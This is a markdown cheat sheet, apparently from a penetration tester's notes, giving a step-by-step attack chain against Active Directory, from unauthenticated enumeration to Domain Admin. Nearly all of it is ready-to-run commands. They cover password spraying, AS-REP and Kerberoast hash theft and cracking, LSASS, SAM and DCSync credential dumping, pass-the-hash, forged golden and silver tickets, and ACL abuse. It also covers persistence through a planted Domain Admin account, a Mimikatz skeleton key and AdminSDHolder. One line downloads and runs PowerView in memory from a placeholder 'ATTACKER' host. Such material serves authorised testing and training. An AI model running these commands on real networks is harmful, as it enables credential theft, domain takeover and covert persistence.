---
title: Active Directory Attack Reference
tags:
  - reference
  - AD
  - active-directory
  - Kerberoasting
  - AS-REP
  - DCSync
  - pass-the-hash
  - golden-ticket
  - cheat-sheet
  - intermediate
created: 2026-03-26
updated: 2026-03-26
source: MITRE ATT&CK, Impacket, BloodHound, Harmj0y research
difficulty: intermediate
---

# 🏰 Active Directory Attack Reference

> Full attack chain from external to Domain Admin. Each section maps to a MITRE ATT&CK technique.

---

## AD Enumeration (No Credentials)

```bash
# Find domain controllers
nmap -p 389,636,88,3268,3269,445 --open 192.168.1.0/24
nmap -sV -p 88,389 --open 192.168.1.0/24

# LDAP anonymous bind (sometimes allowed)
ldapsearch -x -h DC_IP -b "DC=domain,DC=com" "(objectClass=*)" 2>/dev/null | head -50

# SMB null session (older DCs / misconfigs)
smbclient -L \\\\DC_IP\\ -N
enum4linux -a DC_IP

# DNS zone transfer attempt
dig axfr @DC_IP domain.com
```

---

## Credential Attacks from Network

### LLMNR/NBT-NS Poisoning → NTLMv2 Capture (T1557.001)
```bash
# See: Responder note
sudo responder -I eth0 -v
# Hashes saved to /usr/share/responder/logs/
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Password Spraying (T1110.003)
```bash
# Check password policy first (prevent lockouts)
crackmapexec smb DC_IP -u user -p pass --pass-pol
enum4linux -P DC_IP

# Spray (one password, many users)
crackmapexec smb DC_IP -u users.txt -p 'Spring2026!' --continue-on-success

# With Kerbrute (kerberos pre-auth — quieter, no lockout on some configs)
kerbrute passwordspray -d domain.com --dc DC_IP users.txt 'Spring2026!'
```

### AS-REP Roasting (T1558.004)
Targets accounts with "Do not require Kerberos pre-authentication" enabled.

```bash
# Find vulnerable accounts (no creds needed if anonymous LDAP works)
GetNPUsers.py domain.com/ -no-pass -usersfile users.txt -dc-ip DC_IP -format hashcat

# With credentials
GetNPUsers.py domain.com/user:pass -request -dc-ip DC_IP -format hashcat

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

---

## Post-Authentication Enumeration

### BloodHound (T1069, T1087)
```bash
# Collect (from Windows domain-joined or with credentials)
SharpHound.exe -c All --zipfilename bh_data.zip

# From Linux (with credentials)
bloodhound-python -d domain.com -u user -p pass -dc DC_IP -c All --zip

# Import ZIP into BloodHound GUI
# Key queries:
# - Find all Domain Admins
# - Find Shortest Path to Domain Admins
# - Find Kerberoastable Users
# - Find AS-REP Roastable Users
# - Find Principals with DCSync Rights
```

### PowerView Enumeration
```powershell
# Load into memory
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerView.ps1')

Get-NetDomain
Get-NetDomainController
Get-NetUser | Select samaccountname, description, pwdlastset
Get-NetUser -SPN                          # Kerberoastable users
Get-NetUser -PreauthNotRequired           # AS-REP roastable
Get-NetGroup "Domain Admins" -FullData
Find-LocalAdminAccess                     # Where do we have local admin?
Invoke-ACLScanner -ResolveGUIDs           # Abusable ACLs
```

---

## Kerberoasting (T1558.003)

Requests TGS tickets for service accounts with SPNs → crack offline.

```bash
# Impacket (Linux)
GetUserSPNs.py domain.com/user:pass -dc-ip DC_IP -request -outputfile kerberoast.txt

# Rubeus (Windows, in memory)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Crack
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

---

## Credential Dumping (T1003)

### LSASS Dump (T1003.001)
```bash
# Remotely via secretsdump (Impacket)
secretsdump.py domain.com/admin:pass@TARGET_IP

# Via CrackMapExec
crackmapexec smb TARGET_IP -u admin -p pass --sam
crackmapexec smb TARGET_IP -u admin -p pass --lsa

# Locally (on compromised Windows host)
# Mimikatz (if LSASS accessible)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Task Manager / ProcDump → lsass.dmp → offline analysis
procdump.exe -ma lsass.exe lsass.dmp
# Then: mimikatz # sekurlsa::minidump lsass.dmp; sekurlsa::logonpasswords

# Via Impacket on dump file
pypykatz lsa minidump lsass.dmp
```

### SAM Database (T1003.002)
```bash
# Remote via secretsdump
secretsdump.py domain.com/admin:pass@TARGET_IP -sam

# Local registry export (if local admin)
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

### DCSync (T1003.006)
```bash
# Requires: Domain Admin, or account with Replicating Directory Changes / Replicating Directory Changes All
secretsdump.py -just-dc domain.com/admin:pass@DC_IP

# Single user hash
secretsdump.py -just-dc-user krbtgt domain.com/admin:pass@DC_IP

# Mimikatz
mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt
```

---

## Pass-the-Hash (T1550.002)

```bash
# CrackMapExec
crackmapexec smb TARGET_IP -u administrator -H NTLM_HASH

# Impacket psexec / wmiexec
psexec.py -hashes :NTLM_HASH domain.com/administrator@TARGET_IP
wmiexec.py -hashes :NTLM_HASH domain.com/administrator@TARGET_IP

# Evil-WinRM
evil-winrm -i TARGET_IP -u administrator -H NTLM_HASH
```

---

## Pass-the-Ticket (T1550.003)

```bash
# Export ticket from Windows (Rubeus)
.\Rubeus.exe dump /nowrap   # List and export all tickets

# Import on attacker (Linux)
export KRB5CCNAME=/tmp/ticket.ccache
wmiexec.py -k -no-pass domain.com/user@TARGET_IP
```

---

## Ticket Attacks

### Golden Ticket (T1558.001)
Requires krbtgt NTLM hash (post-DC compromise). Generates forged TGT valid for 10 years.

```bash
# Get krbtgt hash (DCSync)
secretsdump.py -just-dc-user krbtgt domain.com/admin:pass@DC_IP

# Create golden ticket (Impacket ticketer)
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXXXXXX-XXXXXXXX-XXXXXXXX -domain domain.com Administrator

# Use golden ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.com/Administrator@DC_IP
```

### Silver Ticket (T1558.002)
Forged TGS for a specific service. Requires service account NTLM hash. Stealthier than golden ticket (no DC contact needed for auth).

```bash
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.com -spn cifs/SERVER.domain.com Administrator
```

---

## ACL Abuse (T1222, T1098)

BloodHound identifies these paths automatically.

| ACL Right | What It Allows |
|---|---|
| GenericAll | Full control — add to groups, change password, etc. |
| GenericWrite | Write most attributes — set SPN → Kerberoast |
| WriteDACL | Modify ACL → grant yourself more rights |
| WriteOwner | Change owner → then modify permissions |
| AllExtendedRights | Includes ForceChangePassword, DCSync rights |
| ForceChangePassword | Change user's password without knowing current |
| AddMember | Add users to groups |

```powershell
# Set SPN on account you control for Kerberoasting
Set-DomainObject -Identity target_user -SET @{serviceprincipalname='fake/spn'}
GetUserSPNs.py domain.com/you:pass -dc-ip DC_IP -request  # Kerberoast it now

# Force password change
$cred = New-Object System.Net.NetworkCredential("","NewPass123!")
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force) -Verbose
```

---

## Persistence (T1098, T1136)

```bash
# Add user to Domain Admins
net user hacker Password123! /add /domain
net group "Domain Admins" hacker /add /domain

# Golden ticket (see above — survives password changes until krbtgt rotated twice)

# Skeleton key (Mimikatz — patches LSASS on DC with backdoor password)
mimikatz # misc::skeleton   # After this: any account password = 'mimikatz'

# AdminSDHolder ACL abuse (persistent escalation path)
# Grant yourself GenericAll on AdminSDHolder container
# SDProp propagates this to all protected groups every 60 min
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=com" -PrincipalIdentity your_user -Rights All
```

---

## Domain Compromise Checklist

```
☐ Enumerate: BloodHound, PowerView, CME
☐ Find path: Shortest Path to Domain Admin in BloodHound
☐ Credential attacks: Kerberoast, AS-REP roast, spray
☐ Lateral movement: Pass-the-hash, WinRM, PsExec
☐ PrivEsc on foothold: Windows PrivEsc checklist
☐ DCSync: secretsdump -just-dc → get all hashes
☐ krbtgt hash → Golden Ticket
☐ Document: Save all hashes, proof.txt contents, evidence
```

---

## Related Notes
- Active-Directory
- BloodHound
- Impacket
- CrackMapExec
- Evil-WinRM
- Responder
- Hashcat
- PowerShell-Security
- Windows-Privilege-Escalation

## References
- MITRE ATT&CK: https://attack.mitre.org
- Impacket: https://github.com/fortra/impacket
- HackTricks AD: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- Harmj0y research: http://www.harmj0y.net

---
<- [[Reference-MOC]]